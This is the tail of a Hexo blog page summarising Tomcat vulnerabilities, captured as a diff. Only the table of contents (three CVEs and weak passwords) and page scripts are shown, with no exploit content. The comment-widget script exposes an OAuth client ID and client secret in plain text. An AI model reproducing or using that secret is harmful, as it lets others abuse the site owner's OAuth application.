class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2016-8735"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">CVE-2016-8735</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">3.1.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">3.1.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-nav-number">3.1.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="toc-nav-number">3.1.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">3.1.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-nav-number">3.1.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-12615"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">CVE-2017-12615</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-nav-number">3.2.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-nav-number">3.2.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-nav-number">3.2.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-1"><span class="toc-nav-number">3.2.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-1"><span class="toc-nav-number">3.2.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-nav-number">3.2.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2020-1938"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">CVE-2020-1938</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-nav-number">3.3.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-nav-number">3.3.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-nav-number">3.3.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-2"><span class="toc-nav-number">3.3.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-2"><span class="toc-nav-number">3.3.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-nav-number">3.3.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Weak-password"><span class="toc-nav-number">3.4.</span> <span class="toc-nav-text">Weak password</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="toc-nav-number">3.4.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-3"><span class="toc-nav-number">3.4.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-nav-number">3.4.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-3"><span class="toc-nav-number">3.4.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-3"><span class="toc-nav-number">3.4.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="toc-nav-number">3.4.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Tools"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">Tools</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">参考</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2020/08/13/Tomcat漏洞汇总/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Tomcat漏洞汇总",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "0f87e490e00ee3fd87ef",
+          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <p class="copyright">
+    皖ICP备19004273
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
